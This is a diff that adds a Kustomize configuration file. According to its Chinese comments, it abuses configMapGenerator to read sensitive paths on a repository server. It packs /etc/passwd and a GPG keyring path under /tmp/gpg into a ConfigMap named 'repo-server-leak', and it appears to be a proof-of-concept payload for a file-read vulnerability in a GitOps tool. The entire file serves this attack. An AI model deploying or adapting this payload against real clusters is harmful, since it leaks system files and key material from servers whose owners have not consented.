@@ -1,0 +1,17 @@
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+
+# 利用配置生成器尝试读取敏感路径
+generatorOptions:
+  disableNameSuffixHash: true
+
+configMapGenerator:
+- name: repo-server-leak
+  files:
+    # 尝试读取 GPG 可能写入的目录（根据你分析的漏洞路径修改）
+    - .gnupg_path=/tmp/gpg/pubring.kbx
+    - /etc/passwd
+
+# 模拟一个基础的 Deployment 容器
+resources:
+- deployment.yaml
